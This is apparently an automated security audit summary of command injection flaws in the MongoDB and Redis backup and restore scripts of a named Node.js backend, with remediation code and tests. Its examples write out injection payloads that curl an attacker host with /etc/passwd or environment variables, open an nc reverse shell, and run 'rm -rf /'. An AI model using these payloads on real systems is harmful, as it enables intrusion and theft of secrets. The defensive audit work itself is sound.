# Command Injection Vulnerabilities - Quick Summary

## Repository
**URL:** https://github.com/mischa23v/traf3li-backend
**Scan Date:** 2025-12-22

---

## Critical Findings

### ⚠️ TOTAL VULNERABILITIES: 10

| Severity | Count |
|----------|-------|
| CRITICAL | 4 |
| HIGH | 5 |
| MEDIUM | 1 |

---

## Vulnerable Files

### 1. restore.js - ⚠️ CRITICAL
**Lines:** 175, 213, 250-254

**Vulnerabilities:**
- ✗ Line 175: Unescaped `localPath` in gzip command
- ✗ Line 213: Unescaped `mongoUri` and `safetyPath` in mongodump
- ✗ Line 250: Unescaped `mongoUri` and `localPath` in mongorestore
- ✗ Line 254: **USER INPUT `oplogLimit` from CLI** - CRITICAL

**Most Dangerous:**
```bash
# Direct command injection via CLI argument
node src/scripts/restore.js --backup=test.gz \
  --oplog-limit='"; curl attacker.com/steal?data=$(cat /etc/passwd) #'
```

---

### 2. backup.js - ⚠️ HIGH
**Lines:** 109, 114-116, 128

**Vulnerabilities:**
- ✗ Line 109: Unescaped `mongoUri` and `backupPath` in mongodump
- ✗ Line 114-116: Unescaped collection names from config

**Attack Vector:**
```javascript
// Malicious config
excludeCollections: ['test"; nc -e /bin/sh attacker.com 4444; #']
```

---

### 3. backupRedis.js - ⚠️ HIGH
**Lines:** 202

**Vulnerabilities:**
- ✗ Line 202: Unescaped `rdbPath` and `backupPath` in gzip command

**Attack Vector:**
- Compromised Redis config or dataDir path

---

### 4. backupScheduler.js - ⚠️ MEDIUM
**Lines:** 47

**Vulnerabilities:**
- ⚠️ Line 47: Potential injection in script execution

**Status:** Currently safe (only internal calls), but vulnerable to future changes

---

## Attack Vectors

### 1️⃣ Command-Line Arguments (CRITICAL)
- **File:** restore.js
- **Parameter:** `--oplog-limit`
- **Exploitable:** YES - Direct user input

### 2️⃣ Configuration Files (HIGH)
- **Files:** All scripts
- **Targets:** MONGODB_URI, excludeCollections, redis paths
- **Exploitable:** If attacker can modify .env or config files

### 3️⃣ S3 Object Keys (MEDIUM)
- **File:** restore.js
- **Target:** Backup filenames
- **Exploitable:** If attacker can upload to S3 bucket

---

## Missing Security Controls

❌ **No input sanitization**
❌ **No shell escaping library** (shell-escape, shell-quote)
❌ **Using exec() instead of execFile()/spawn()**
❌ **No validation of CLI arguments**
❌ **No whitelisting of allowed characters**

---

## API Exposure

✅ **GOOD NEWS:** Backup scripts are **NOT exposed via API endpoints**

Scripts are only accessible via:
- npm scripts (package.json)
- Direct CLI execution
- Cron scheduler (backupScheduler.js)

**Note:** While not exposed via APIs, scripts can still be exploited by:
- Administrators running scripts
- Automated backup processes
- Compromised configuration files

---

## Proof of Concept

### PoC 1: Direct CLI Injection (restore.js)

```bash
# Inject command via oplog-limit parameter
node src/scripts/restore.js \
  --backup=test.gz \
  --oplog-limit='1"; echo "PWNED" > /tmp/pwned.txt; #'

# Verify exploitation
cat /tmp/pwned.txt  # Output: PWNED
```

### PoC 2: Config Poisoning (backup.js)

```javascript
// Malicious backup.config.js
module.exports = {
  mongodb: {
    dumpOptions: {
      excludeCollections: ['test"; curl http://attacker.com/exfiltrate?data=$(env|base64); #']
    }
  }
};
```

---

## Immediate Actions Required

### 🔴 CRITICAL (Fix Today)

1. **Replace exec() with execFile()**
   ```javascript
   // Before (VULNERABLE)
   await execAsync(`mongodump --uri="${uri}"`);

   // After (SECURE)
   await execFileAsync('mongodump', ['--uri', uri]);
   ```

2. **Validate oplogLimit parameter**
   ```javascript
   if (!/^[0-9]+:[0-9]+$/.test(oplogLimit)) {
     throw new Error('Invalid oplog limit format');
   }
   ```

### 🟠 HIGH (Fix This Week)

3. **Install shell-escape library**
   ```bash
   npm install shell-escape
   ```

4. **Validate all file paths**
   ```javascript
   const resolved = path.resolve(inputPath);
   if (!allowedDirs.some(dir => resolved.startsWith(dir))) {
     throw new Error('Path outside allowed directories');
   }
   ```

5. **Validate collection names**
   ```javascript
   if (!/^[a-zA-Z0-9_.-]+$/.test(collectionName)) {
     throw new Error('Invalid collection name');
   }
   ```

---

## Secure Code Pattern

### ✅ SECURE: Use execFile with array arguments

```javascript
const { execFile } = require('child_process');
const { promisify } = require('util');
const execFileAsync = promisify(execFile);

// Build arguments as array (NO shell interpretation)
const args = [
  '--uri', mongoUri,
  '--archive', backupPath,
  '--gzip',
  '--drop'
];

if (oplogLimit) {
  // Validate first
  if (!/^[0-9]+:[0-9]+$/.test(oplogLimit)) {
    throw new Error('Invalid format');
  }
  args.push('--oplogLimit', oplogLimit);
}

// Execute safely
await execFileAsync('mongorestore', args);
```

---

## Testing

### Unit Test Example

```javascript
describe('Command Injection Prevention', () => {
  test('should reject malicious oplog limit', () => {
    const malicious = '"; rm -rf /';
    expect(() => validateOplogLimit(malicious)).toThrow();
  });

  test('should accept valid oplog limit', () => {
    const valid = '1638360000:1';
    expect(() => validateOplogLimit(valid)).not.toThrow();
  });
});
```

---

## Impact Assessment

| Risk Area | Rating | Impact |
|-----------|--------|--------|
| Confidentiality | CRITICAL | Full database access |
| Integrity | CRITICAL | Database modification/deletion |
| Availability | CRITICAL | Service disruption via DoS |
| Privilege Escalation | HIGH | Execute commands as Node.js process user |
| Data Exfiltration | CRITICAL | Extract sensitive data |

---

## Timeline

| Priority | Action | Timeline |
|----------|--------|----------|
| CRITICAL | Fix restore.js oplogLimit | Today |
| CRITICAL | Replace all exec() with execFile() | This Week |
| HIGH | Add input validation | This Week |
| HIGH | Install shell-escape library | This Week |
| MEDIUM | Add audit logging | Next Sprint |
| MEDIUM | Add monitoring | Next Sprint |

---

## References

- Full Report: `COMMAND_INJECTION_SECURITY_REPORT.md`
- OWASP: https://owasp.org/www-community/attacks/Command_Injection
- CWE-78: https://cwe.mitre.org/data/definitions/78.html

---

**Status:** 🔴 VULNERABLE - Immediate action required
**Next Review:** After remediation
